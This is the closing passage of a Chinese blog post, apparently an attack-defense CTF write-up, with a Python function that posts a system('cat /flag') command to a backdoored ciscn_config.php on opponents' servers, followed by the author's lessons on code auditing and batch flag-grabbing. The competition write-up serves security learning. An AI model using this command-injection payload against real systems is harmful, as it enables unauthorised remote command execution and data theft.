<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_config2(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;118.89.227.105:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_config.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;x&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    #key&#x3D;&#39;&#39;</span><br><span class="line">    #print(req.text)</span><br><span class="line">    key&#x3D;(req.text).split(&#39;: &#39;)[-1]</span><br><span class="line">    flag.append(key)</span><br><span class="line">    print(flag)</span><br><span class="line">    #exception(req)</span><br></pre></td></tr></table></figure>
<hr>
<p>至此，以上为本人此次比赛找到的所有洞，收获颇多.</p>
<blockquote>
<p>1.隐藏在正常服务中的洞往往不容易被发现（废话）,简单删除后会因此失分，因此审代码是相当重要的能力。</p>
</blockquote>
<blockquote>
<p>2.提高速度，AWD往往是比手速，尽管在比赛当时笔者拿flag的方式相当弱智，但事后通过对批量化的学习以及应用加深了对此的体会。</p>
</blockquote>
<blockquote>
<p>3.继续努力。</p>
</blockquote>

        </div>

        
            <div class="post-copyright-info">
                <div class="article-copyright-info-container">
    <ul>
        <li>本文标题：AWD-1</li>
        <li>本文作者：煤矿路口西</li>
        <li>创建时间：2021-03-22 20:56:06</li>
        <li>
            本文链接：http://www.mklkx.xyz/2021/03/22/AWD-1/
        </li>
        <li>
            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
        </li>
    </ul>
</div>

            </div>
        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2021/03/24/VNCTF2021/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">VNCTF2021</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2021/03/22/picoCTF2020/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">picoCTF2020</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2019</span>&nbsp;-&nbsp;
            
            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">煤矿路口西</a>
        </div>
        
            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
        </div>
        
            <div class="icp-info info-item"><a target="_blank" rel="nofollow" href="https://beian.miit.gov.cn">冀ICP备2021010275号</a></div>
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">simple</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">1.1.</span> <span class="nav-text">准备工作：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">1.2.</span> <span class="nav-text">1</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link"><span class="nav-number">1.2.1.</span> <span class="nav-text">.config_common.php</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">1.3.</span> <span class="nav-text">2</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link"><span class="nav-number">1.3.1.</span> <span class="nav-text">pdd.php</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">1.4.</span> <span class="nav-text">3</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link"><span class="nav-number">1.4.1.</span> <span class="nav-text">111.php</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">1.5.</span> <span class="nav-text">4</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link"><span class="nav-number">1.5.1.</span> <span class="nav-text">4eff2c041976ea22afb7092a53188c70.php</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">1.6.</span> <span class="nav-text">5</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link"><span class="nav-number">1.6.1.</span> <span class="nav-text">ciscn_url.php</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">1.7.</span> <span class="nav-text">6</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link"><span class="nav-number">1.7.1.</span> <span class="nav-text">ciscn_notes.php</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">1.8.</span> <span class="nav-text">7</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link"><span class="nav-number">1.8.1.</span> <span class="nav-text">ciscn_include.php</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">1.9.</span> <span class="nav-text">8</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link"><span class="nav-number">1.9.1.</span> <span class="nav-text">ciscn_config.php</span></a></li></ol></li></ol></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>




<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>



    
<script src="/js/local-search.js"></script>




    
<script src="/js/code-copy.js"></script>




    
<script src="/js/lazyload.js"></script>



<div class="post-scripts pjax">
    
        
<script src="/js/left-side-toggle.js"></script>

<script src="/js/libs/anime.min.js"></script>

<script src="/js/toc.js"></script>

    
</div>


    
<script src="/js/libs/pjax.min.js"></script>

<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
